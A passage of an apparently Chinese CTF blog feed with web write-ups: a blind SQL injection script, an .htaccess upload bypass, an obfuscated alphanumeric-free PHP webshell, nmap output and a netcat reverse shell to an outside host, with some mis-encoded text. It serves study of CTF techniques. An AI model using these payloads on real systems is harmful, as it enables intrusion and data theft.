&#96;2&#96; from (select 1,2 union select * from flag)a limit 1,1</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-"</span>:</span><br><span class="line">        url = <span class="string">'http://1ff59e94406f4210a83ac8268a0037c3334b9006071c441b.changame.ichunqiu.com/register_do.php'</span></span><br><span class="line">        payload = <span class="string">"1'^if(ascii(substr((select `2` from (select 1,2 union select * from flag)a limit 1,1),"</span>+str(i)+<span class="string">",1))="</span> + str(ord(j)) + <span class="string">",pow(99999,100) or sleep(3),pow(99999,100)),'1')#"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: payload,</span><br><span class="line">            <span class="string">'password'</span>: <span class="string">'321'</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">3.0</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag+=j</span><br><span class="line">            print(flag)</span><br><span class="line">            a=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WEB-writeup/5.png" class="lazyload" data-srcset="5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è€å®è¯´æœ€ååå‡ åˆ†é’Ÿå¯èƒ½ä¸å¤Ÿåšå‡ºæ¥çš„å§ã€‚ä½†å¦‚æœæ›´æ—©ç‚¹æ•é”çš„å¯Ÿè§‰åˆ°è¿™ç§æ³¨å…¥å¹¶æ‰¾åˆ°æ‰‹æ®µå°±å¥½äº†â€¦ä½†æ˜¯è¿™é¢˜æ”¶è·è¿˜æ˜¯ä¸å°‘çš„ã€‚æ¯•ç«Ÿè‡ªå·±å¥½ä¹…æ²¡è§åˆ°insert_intoçš„ç›²æ³¨ã€‚æ‰‹æ³•ä¹Ÿç”Ÿç–äº†ä¸å°‘ã€‚sqlæ³¨å…¥çš„æŠ€å·§å­¦ä¹ è¿˜è¦ç»§ç»­åŠ æŠŠåŠ²å•Šã€‚</p><h1 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h1><p>ç½‘é¼ç»“æŸåè¿™ä¸ªæœˆè¿˜æœ‰ä¸å°‘å…¶ä»–æ¯”èµ›ã€‚ä¸è¿‡ä¼°è®¡æ²¡å¤šå°‘æ—¶é—´èŠ±åœ¨CTFä¸Šäº†ã€‚è¿™ä¸ªæœˆä¸€æ–¹é¢å¸Œæœ›æŠŠjava,æ¸—é€ç­‰æ–¹é¢çš„çŸ¥è¯†å†æ¥è§¦ä¸‹ã€‚ç„¶åæ¯”èµ›æ‰“å¥½ã€‚ç­‰ä¸‹ä¸ªæœˆå·®ä¸å¤šå°±è¦ä¸“æ³¨åœ¨å­¦ä¸šä¸Šäº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1CTF2020</title>
      <link href="2020/05/04/De1CTF2020writeup/"/>
      <url>2020/05/04/De1CTF2020writeup/</url>
      
        <content type="html"><![CDATA[<p>ç»ˆäºåˆ°ç¬¬äºŒæ¬¡XCTFäº†ã€‚æ²¡æƒ³åˆ°De1taçš„é¢˜è¿™æ¬¡è¿™ä¹ˆé¡¶ï¼Œæœç„¶æ˜¯å‡ºç»™å›½é™…é˜Ÿä¼çš„éš¾åº¦ã€‚(è†œä¸€æ³¢å›½å†…å¤–å¤§ä½¬é˜Ÿä¼)<br>å°ç»¿è‰è¿™æ¬¡ä¹Ÿå°±æˆ‘ä»¬å¤§äºŒçš„å‡ ä¸ªåœ¨æ‰“ï¼Œå¤§å®¶åŸºæœ¬éƒ½è‡ªé—­äº†ã€‚WEBè‡ªå·±ä¹Ÿåªåšå‡ºä¸¤é“é¢˜ï¼Œè¯´å®è¯è¦æ˜¯è‡ªå·±JAVAçš„å­¦ä¹ è®¡åˆ’å†æå‰ä¸€ç‚¹çš„è¯è¯´ä¸å®šèƒ½æŠŠcalcé‚£é¢˜å‡ºäº†çš„â€¦<br>è¿™æ ·ä¹Ÿä¸è‡³äºè¢«å¡åœ¨20åå¼€å¤–ã€‚</p><p>ç­‰wpå‡ºæ¥è‡ªå·±äº‰å–æŠŠèƒ½åšçš„é¢˜éƒ½å¤ç°äº†ã€‚</p><a id="more"></a><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>è¿™é¢˜è¿˜ç®—æ¯”è¾ƒç®€å•.å°±æ˜¯è‡ªå·±ä¸€å¼€å§‹æ‰‹è´±é€‰çš„mixtureå»åšæµªè´¹äº†ä¸å°‘æ—¶é—´</p><p>é¦–å…ˆç®€å•ä¸Šä¼ FUZZä¸‹ï¼Œä¼šå‘ç°é™åˆ¶äº†filenameï¼Œfiletypeä»¥åŠfileçš„å†…å®¹<br>å…¶ä»–çš„éƒ½è¿˜å¥½ã€‚ä¸è¿‡å†…å®¹é»‘åå•é‡Œ<br><code>perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents</code><br>ä¸»è¦æ˜¯ä¸€ä¸ªphçš„é—®é¢˜ã€‚å¯¹webshellè€Œè¨€,åº”è¯¥åªèƒ½ä½¿ç”¨ä¸é—­åˆçš„çŸ­æ ‡ç­¾äº†</p><p>ä½†æ˜¯å› ä¸ºæ–‡ä»¶åç¼€ä¸¥æ ¼é™åˆ¶ï¼Œæ‰€ä»¥åªèƒ½æŒ‰ç…§è¦æ±‚ä¸Šä¼ å›¾ç‰‡é©¬ã€‚ç°åœ¨éœ€è¦.htaccessæ¥æ§åˆ¶è§£æå®ƒã€‚<br>å¹¸è¿çš„æ˜¯ï¼Œ.htaccesså¹¶æ²¡æœ‰è¢«é™åˆ¶<br>ä¸è¿‡æ³¨æ„ã€‚.htaccessä¸­å¸¸è§çš„å‡ ç§æŠŠ.jpgè§£ææˆphpçš„å†™æ³•ä¸­ï¼Œphpæ˜¯å¿…ä¸å¯å°‘çš„.é‚£å°±å¾—ç»•è¿‡é™åˆ¶ä¸Šä¼ </p><p>è¿™é‡Œå°±æœ‰ä¸¤ç§æ€è·¯äº†ï¼Œä¸€ç§æ˜¯ä¸Šä¼ cgiè¿›è¡Œgetshell,å½“æ—¶ç®€å•æœäº†ä¸‹å‘ç°ç¡®å®å¹¶ä¸éœ€è¦phpå‡ºç°</p><p>ä½†æ˜¯æ›´ç®€å•çš„æ˜¯æ¥è‡ªXNUCAçš„éé¢„æœŸè§£ã€‚ä½¿ç”¨\ç›´æ¥ç»•è¿‡wafã€‚<br>å³ä½¿æ˜¯.htaccessè¿™ç§è¯´æ³•ä¸Šä¸å…è®¸æ¢è¡Œçš„æ–‡ä»¶ï¼Œå®ƒä¹Ÿæ˜¯æ”¯æŒ<code>\</code>ç›´æ¥æ¢è¡Œçš„ï¼Œå› æ­¤è½»æ¾bypass</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addtype application&#x2F;x-httpd-p\</span><br><span class="line">hp .jpg</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=system(<span class="string">'cat /flag'</span>);</span><br></pre></td></tr></table></figure><p><img src="/2020/05/04/De1CTF2020writeup/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a>Hard_Pentest_1</h2><p>åšå®Œè¿™é¢˜çœŸçš„æ˜¯å¾—åº†å¹¸è‡ªå·±å½“åˆhtbåšäº†å°windowsçš„é¶æœºã€‚ä¸ç„¶è¿åšä¸‹å»çš„å‹‡æ°”éƒ½æ²¡æœ‰</p><p>æ¯”èµ›æ—¶æ²¡å’‹æˆªå›¾,å°†å°±ä¸‹çœ‹å§<br>é¦–å…ˆç¬¬ä¸€æ­¥æ˜¯ç»™å‡ºçš„ä¸Šä¼ æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//Clear the uploads directory every hour</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$sandbox = <span class="string">"uploads/"</span>. md5(<span class="string">"De1CTF2020"</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">"submit"</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span> (($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">2048</span>) &amp;&amp; Check())&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $filename=md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"_"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $filename);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"save in:"</span> . $sandbox.<span class="string">"/"</span> . $filename;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not Allow!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $BlackExts = <span class="keyword">array</span>(<span class="string">"php"</span>);</span><br><span class="line">    $ext = explode(<span class="string">"."</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">    $exts = trim(end($ext));</span><br><span class="line">    $file_content = file_get_contents($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9;~^`&amp;|]/is'</span>,$file_content)  &amp;&amp; </span><br><span class="line">        !in_array($exts, $BlackExts) &amp;&amp; </span><br><span class="line">        !preg_match(<span class="string">'/\.\./'</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>])) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>webshellçš„é™åˆ¶,ä¸»è¦æ˜¯æ–‡ä»¶åç¼€è·Ÿå†…å®¹ã€‚<br>è‡ªå·±ä¸€å¼€å§‹çš„æƒ³æ³•æ˜¯æ­£åˆ™å›æº¯ç»•ä¸‹<code>!preg_match()</code>ä½†æ˜¯å¾ˆå¿«å°±å‘ç°æ–‡ä»¶å¤ªå¤§ä¼ ä¸ä¸Šå»ã€‚<br>è€Œä¸”webshellè¿åˆ†å·éƒ½æ²¡äº†,ä¸å¥½æ„é€ ã€‚<br>ç»é˜Ÿå‹æé†’æ˜¯å°windowsé¶æœº,å¯ä»¥åˆ©ç”¨windwosä¸åŒºåˆ†å¤§å°å†™çš„ç‰¹æ€§ä¸Šä¼ ã€‚<br>åŒæ—¶å†…å®¹å¯ä»¥å‚è€ƒXCTFFINALlfi,ç”¨å…¨çŸ­æ ‡ç­¾æ„é€ æ— å­—æ¯æ•°å­—webshell<br>å¤§æ¦‚æ˜¯ä¸‹é¢è¿™æ ·çš„å§,å½“æ—¶è‡ªå·±å†™çš„ç”¨ä¸å‡ºæ¥ï¼Œå€Ÿäº†éƒå¸ˆå‚…çš„ç›´æ¥ä¸Šè½¦ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=$_=[]<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$_=@<span class="string">"$_"</span><span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$_=$_[<span class="string">'!'</span>==<span class="string">'@'</span>]<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>= $___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____=<span class="string">'_'</span><span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$_=$$____<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$_[__]($_[_])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å½“æ—¶è¿˜é¡ºæ‰‹nmapæ‰«äº†ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-02 13:27 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 47.113.219.76</span><br><span class="line">Host is up (0.016s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT     STATE  SERVICE       VERSION</span><br><span class="line">22/tcp   closed ssh</span><br><span class="line">80/tcp   open   http          Microsoft IIS httpd 8.5 (PHP 7.2.29)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Unknown</span><br><span class="line">|_http-title: upload</span><br><span class="line">3389/tcp closed ms-wbt-server</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 118.83 seconds</span><br></pre></td></tr></table></figure><p>ç„¶åæƒ³æŠ±éƒå¸ˆå‚…å¤§è…¿å¤±è´¥äº†â€¦åªèƒ½é è‡ªå·±äº†ã€‚<br>å› ä¸ºé¢˜ç›®åŒä¸€ä¸ªipè¢«å‡ºæˆä¸¤ä¸ªé¢˜ï¼ŒåŸºæœ¬å¾ˆå®¹æ˜“èƒ½çœ‹å‡ºæ¥è¦ä¹ˆæ˜¯å•çº¯ææƒ,è¦ä¹ˆæ˜¯windowsåŸŸæ¸—é€ã€‚</p><p>è¿™é‡Œwindowsé¶æœºå…«æˆå°±æ˜¯ä¸ºäº†åŸŸæ¸—é€å‡†å¤‡çš„ã€‚</p><p>ç¡¬ç€å¤´çš®ä¸ç®¡3721å…ˆå¼¹ä¸ªshell<br>å½“æ—¶æ ¹ç›®å½•æœ‰åˆ«çš„å¸ˆå‚…ä¼ çš„NC,é‚£å°±ä¸ç”¨æˆ‘è‡ªå·±ä¼ äº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\nc.exe vpsip port -e powershell</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¸è‡³äºåœ¨uploadsç›®å½•è¢«åˆ æ—¶ä¸¢æ‰æ‰€æœ‰shell.<br>ç„¶åä¼ ä¸ªwinPEAS.exe è¿›è¡Œä¿¡æ¯æ”¶é›†ã€‚<br>è¿™ä¸ªä¹Ÿæ˜¯åšhtbæ—¶å­¦åˆ°çš„è„šæœ¬ï¼Œä¸€èˆ¬æ˜¯ä¸ºäº†ææƒæ‰«æä¸‹ã€‚åŸºæœ¬ä¸Šèƒ½æ»¡è¶³éœ€æ±‚ã€‚<br>ä¿¡æ¯é‡Œæœ‰ä¸€å¤„æ¯”è¾ƒæ˜æ˜¾<br><img src="/2020/05/04/De1CTF2020writeup/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è„šæœ¬åˆ—å‡ºçš„ä¿¡æ¯ä¸­æœ‰ä¸€ä¸ªåŸŸç”¨æˆ·åå­—å¾ˆæ•æ„Ÿã€‚HintZip_Pass<br>ä¸‹é¢å¼€å§‹æ‰‹åŠ¨ä¿¡æ¯æ”¶é›†</p><p>å‚è€ƒè¿™ç¯‡æ–‡ç« <a href="https://wh0ale.github.io/2018/12/19/2018-12-19-%E5%9F%9F%E6%B8%97%E9%80%8F/" target="_blank" 